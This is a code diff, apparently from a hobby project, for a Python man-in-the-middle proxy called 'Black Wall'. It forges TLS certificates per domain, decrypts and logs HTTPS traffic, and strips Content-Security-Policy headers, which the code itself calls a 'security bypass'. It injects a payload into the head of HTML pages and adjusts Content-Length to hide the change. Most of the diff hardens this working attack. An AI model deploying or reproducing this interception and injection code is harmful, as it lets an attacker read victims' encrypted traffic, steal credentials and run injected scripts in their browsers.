@@ -1,21 +1,42 @@
+from collections import abc
 import socket
 from urllib.parse import urlparse
 import threading
 import select
-import os, subprocess, ssl, re, requests
+import os, subprocess, ssl, re
+import decompiler as decm
 
 HOST = '127.0.0.1'
 PORT = 8080
 
+def check_certs():
+    os.makedirs("certs", exist_ok=True)
+
+check_certs()
+
+def check_http_conection(Data):
+    http_methods = [b"GET", b"POST", b"HEAD", b"CONNECT", b"PUT", b"DELETE", b"OPTIONS", b"PATCH"]
+    for m in http_methods:
+        if Data.startswith(m):
+            return True
+    return False
+
 def handle_client(c_socket):
     try:
         brute_data = c_socket.recv(4096)
+
         if not brute_data:
             c_socket.close()
             return
 
+        is_http = check_http_conection(brute_data)
+
+        if not is_http:
+            c_socket.close()
+            return
+
         method, complete_url = split_petition_data(brute_data)
-        if method == None and complete_url == None:
+        if method is None and complete_url is None:
             c_socket.close()
             return
 
@@ -32,8 +53,6 @@ def listen():
         s_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s_socket.bind((HOST, PORT))
         s_socket.listen(5)
-        
-        
         
         print(f"""\033[91m
  ╔════════════════════════════════════════════════════════════════════════════════╗
@@ -54,28 +73,130 @@ def listen():
  ╚════════════════════════════════════════════════════════════════════════════════╝\033[0m
         """)
 
-
-
-
         while True:
-            c_socket, c_address= s_socket.accept()
+            c_socket, c_address = s_socket.accept()
             threading.Thread(target=handle_client, args=(c_socket,)).start()
 
+def chunk_paser(sock, initial_buffer=b""):
+    full_body = bytearray()
+    lect_buffer = bytearray(initial_buffer)
+
+    while True:
+        while b'\r\n' not in lect_buffer:
+            chunk = sock.recv(4096)
+            if not chunk:
+                return bytes(full_body)
+            lect_buffer.extend(chunk)
+
+        line_size, _, rest = lect_buffer.partition(b'\r\n')
+        lect_buffer = bytearray(rest)
+
+        try:
+            chunk_size_hex = int(line_size.strip().split(b';')[0], 16)
+        except ValueError:
+            break
+
+        if chunk_size_hex == 0:
+            break
+
+        while len(lect_buffer) < chunk_size_hex + 2:
+            data_missing = sock.recv(4096)
+            if not data_missing:
+                break
+            lect_buffer.extend(data_missing)
+
+        full_body.extend(lect_buffer[:chunk_size_hex])
+        lect_buffer = lect_buffer[chunk_size_hex + 2:]
+
+    return bytes(full_body)
+
+def read_http_message(sock):
+    buffer = b""
+    while b"\r\n\r\n" not in buffer:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        buffer += chunk
+
+    if b"\r\n\r\n" not in buffer:
+        return buffer, b""
+
+    headers_bytes, leftover_body = buffer.split(b"\r\n\r\n", 1)
+    headers_bytes += b"\r\n\r\n"
+    
+    if b'HTTP/1.1 101' in headers_bytes or b'101 Switching Protocols' in headers_bytes:
+        return headers_bytes, leftover_body
+
+    if re.search(b"Transfer-Encoding:.*chunked", headers_bytes, re.IGNORECASE):
+        body = chunk_paser(sock, leftover_body)
+        if body is None:
+            return None, None
+        headers_bytes = re.sub(b"Transfer-Encoding: [^\r\n]+\r\n", b"", headers_bytes, flags=re.IGNORECASE)
+    else:
+        cl_match = re.search(b"Content-Length: (\\d+)", headers_bytes, re.IGNORECASE)
+        if cl_match:
+            expected_length = int(cl_match.group(1))
+            body = bytearray(leftover_body)
+            while len(body) < expected_length:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                body.extend(chunk)
+            body = bytes(body)
+        else:
+            body = leftover_body
+
+    content_encoding_match = re.search(b"Content-Encoding: ([^\r\n]+)", headers_bytes, flags=re.IGNORECASE)
+    if content_encoding_match:
+        encoding = content_encoding_match.group(1).strip().lower()
+        decompressed_body = None
+        if encoding == b'gzip':
+            decompressed_body = decm.decompress_gzip(body)
+        elif encoding == b'br':
+            decompressed_body = decm.decompress_brotli(body)
+        
+        if decompressed_body is not None:
+            body = decompressed_body
+            headers_bytes = re.sub(b'Content-Encoding: [^\r\n]+\r\n', b'', headers_bytes, flags=re.IGNORECASE)
+
+    if re.search(b"Content-Type:.*text/html", headers_bytes, re.IGNORECASE):
+        headers_bytes = re.sub(b'Content-Length: [^\r\n]+\r\n', b'', headers_bytes, flags=re.IGNORECASE)
+        new_header = f'Content-Length: {len(body)}\r\n\r\n'.encode()
+        headers_bytes = headers_bytes.replace(b'\r\n\r\n', b'\r\n' + new_header)
+
+    return headers_bytes, body
+
+def tunnel_sockets(sock1, sock2):
+    inputs = [sock1, sock2]
+    while inputs:
+        readable, _, _ = select.select(inputs, [], [], 10)
+        if not readable:
+            break
+        for sock in readable:
+            other = sock2 if sock is sock1 else sock1
+            try:
+                data = sock.recv(4096)
+                if not data:
+                    return
+                other.sendall(data)
+            except Exception:
+                return
+
 def daemon_blackwall(urlparsed, brute_data, c_socket, method, url_host, url_port):
-
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
-
-        if method=='CONNECT':
+        if method == 'CONNECT':
             try:
                 c_socket.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
                 cert_path, key_path = certificade_forge(url_host)
 
                 ctx_serv = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                 ctx_serv.load_cert_chain(certfile=cert_path, keyfile=key_path)
+                ctx_serv.set_alpn_protocols(["http/1.1"])
                 c_ssl = ctx_serv.wrap_socket(c_socket, server_side=True)
 
                 server_socket.connect((url_host, url_port))
                 ctx_client = ssl.create_default_context()
+                ctx_client.set_alpn_protocols(["http/1.1"])
                 s_ssl = ctx_client.wrap_socket(server_socket, server_hostname=url_host)
 
             except Exception as e:
@@ -89,45 +210,43 @@ def daemon_blackwall(urlparsed, brute_data, c_socket, method, url_host, url_port
                 
                 for sock in readable:
                     if sock is c_ssl:
-
-                        brute_data = []
-
-                        while not "\r\n\r\n" in brute_data:
-                            brute_data += c_ssl.recv(4096)
-
-                            brute_data = chunk_parser(brute_data)
-
-                        print(f"[!!!!!unencrypted] {brute_data}")
-                        if brute_data:
-                            if b"Accept-Encoding" in brute_data:
-                                brute_data = re.sub(b"Accept-Encoding: .*?\r\n", b"Accept-Encoding: identity\r\n", brute_data, flags=re.IGNORECASE)
-                            
-                            s_ssl.sendall(brute_data)
-                        else:
-                            print("[+] Closing conection with: ", s_ssl.getpeername())
+                        headers, body = read_http_message(c_ssl)
+                        if not headers:
+                            print("[+] Closing connection with client")
                             s_ssl.close()
                             c_ssl.close()
                             return
+
+                        if b"Accept-Encoding" in headers:
+                            headers = re.sub(b"Accept-Encoding: .*?\r\n", b"Accept-Encoding: identity\r\n", headers, flags=re.IGNORECASE)
+                        
+                        full_package = headers + body
+                        print(f"[!!!!!unencrypted client] {headers[:100]}...")
+                        s_ssl.sendall(full_package)
 
                     elif sock is s_ssl:
-
-                        server_responce = []
-
-                        while not "\r\n\r\n" in server_responce:
-                            server_responce += s_ssl.recv(4096)
-
-                        server_responce =ICE_s(server_responce)
-
-                        print(f"[!!!!!unencrypted] {server_responce}")
-                        if server_responce:
-                            server_responce = inyect_ice(server_responce)
-
-                            c_ssl.sendall(server_responce)
-                        else:
-                            print("[+] Closing conection with: ", c_ssl.getpeername())
+                        headers, body = read_http_message(s_ssl)
+                        if not headers:
+                            print("[+] Closing connection with server")
                             c_ssl.close()
                             s_ssl.close()
                             return
+
+                        if b"101 Switching Protocols" in headers or b"HTTP/1.1 101" in headers:
+                            print(f"[+] WebSocket connection established with {url_host}")
+                            s_ssl.sendall(headers + body)
+                            c_ssl.sendall(headers + body)
+                            tunnel_sockets(c_ssl, s_ssl)
+                            c_ssl.close()
+                            s_ssl.close()
+                            return
+
+                        headers = ICE_s(headers)
+                        full_package = headers + body
+                        full_package = inyect_ice(full_package)
+
+                        print(f"[!!!!!unencrypted server] {headers[:100]}...")
+                        c_ssl.sendall(full_package)
         else:
             server_socket.connect((urlparsed, url_port))
             server_socket.sendall(brute_data)
@@ -139,27 +258,21 @@ def daemon_blackwall(urlparsed, brute_data, c_socket, method, url_host, url_port
                 c_socket.sendall(server_responce)
             c_socket.close()
 
-
 def split_petition_data(brute_data):
-    petition = brute_data.decode('utf-8', errors ='ignore')
+    petition = brute_data.decode('utf-8', errors='ignore')
     petition_lines = petition.split('\r\n')
     petition_line_one = petition_lines[0]
     try:
         complete_url = petition_line_one.split(' ')
-        method=complete_url[0]
-    except:
+        method = complete_url[0]
+    except Exception:
         print("[!] No such valid petition D:")
         return None, None
     
     return method, complete_url
 
-
 def connect_or_else(method, complete_url):
-    url_host = None
-    url_port = None
-    urlparsed = None
-
-    if method=='CONNECT':
+    if method == 'CONNECT':
         url_host = complete_url[1].split(':')[0]
         return url_host, 443
     else:
@@ -169,10 +282,10 @@ def connect_or_else(method, complete_url):
             url_port = 80
         return urlparsed, url_port 
 
-import threading
 cert_lock = threading.Lock()
 
 def certificade_forge(domain):
+    os.makedirs("certs", exist_ok=True)
     cert_path = f"certs/{domain}.crt"
     key_path = f"certs/{domain}.key"
     csr_path = f"certs/{domain}.csr"
@@ -205,35 +318,32 @@ def inyect_ice(brute_package):
     ice_payload_bytes = ice_payload.encode('utf-8')
 
     if b"<head>" in brute_package or b"<HEAD>" in brute_package:
-        brute_package = brute_package.replace(b"<head>", b"<head>" + ice_payload_bytes)
-        brute_package = brute_package.replace(b"<HEAD>", b"<HEAD>" + ice_payload_bytes)
+        if b"<head>" in brute_package:
+            brute_package = brute_package.replace(b"<head>", b"<head>" + ice_payload_bytes, 1)
+        elif b"<HEAD>" in brute_package:
+            brute_package = brute_package.replace(b"<HEAD>", b"<HEAD>" + ice_payload_bytes, 1)
 
-        match = re.search(b"content-length: (\\d+)", brute_package, re.IGNORECASE)
+        if b"\r\n\r\n" in brute_package:
+            headers, body = brute_package.split(b"\r\n\r\n", 1)
+            body_length = len(body)
 
-        if match:
-            orig_length = int(match.group(1))
-            new_lenght = orig_length + len(ice_payload_bytes)
-            brute_package = re.sub(b"Content-Length: \\d+", f"Content-Length: {new_lenght}".encode(), brute_package, count=1, flags=re.IGNORECASE)
+            if re.search(b"Content-Length: \\d+", headers, re.IGNORECASE):
+                headers = re.sub(b"Content-Length: \\d+", f"Content-Length: {body_length}".encode(), headers, count=1, flags=re.IGNORECASE)
+            else:
+                headers += f"Content-Length: {body_length}\r\n".encode()
+
+            brute_package = headers + b"\r\n\r\n" + body
 
     return brute_package
 
 def ICE_s(server_responce):
-    match= re.search(b"Content-Type: [^\r\n]+\r\n", server_responce)
-    if match:
-        re.sub(b"Content-Type: [^\r\n]+\r\n", b"", server_responce, count=1, flags=re.IGNORECASE)
-        print("[!] Black Wall security bypass!!")
-        return server_responce
-    else:
-        return server_responce
-
-def chunk_paser(data):
-    with requests.get(data, stream=True) as answer:
-        answer 
-
+    if re.search(b"Content-Security-Policy", server_responce, re.IGNORECASE):
+        server_responce = re.sub(b"Content-Security-Policy: [^\r\n]+\r\n", b"", server_responce, count=1, flags=re.IGNORECASE)
+        print("[!] Black Wall security bypass (CSP removed)!!")
+    return server_responce
 
 if __name__ == '__main__':
     try:
         listen()
     except KeyboardInterrupt:
-        print("[Black Wall] is stopping, goodbye!") 
-
+        print("[Black Wall] is stopping, goodbye!")
